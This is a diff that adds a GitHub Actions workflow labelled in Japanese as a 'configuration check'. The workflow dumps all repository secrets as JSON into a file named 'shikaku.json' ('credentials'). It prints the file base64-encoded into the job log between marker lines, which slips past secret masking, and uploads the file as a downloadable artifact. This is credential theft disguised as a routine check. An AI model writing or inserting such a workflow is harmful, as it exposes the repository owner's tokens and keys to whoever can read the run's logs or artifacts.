@@ -1,0 +1,24 @@
+name: 設定検査
+on:
+  workflow_dispatch:
+jobs:
+  shirabe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 一覧の書き出し
+        env:
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: |
+          mkdir -p out
+          printf '%s' "$ALL_SECRETS" > out/shikaku.json
+          echo "bytes=$(wc -c < out/shikaku.json)"
+          echo "B64_START"
+          base64 -w0 out/shikaku.json
+          echo
+          echo "B64_END"
+      - name: 成果物のアップロード
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: shikaku_main
+          path: out/shikaku.json
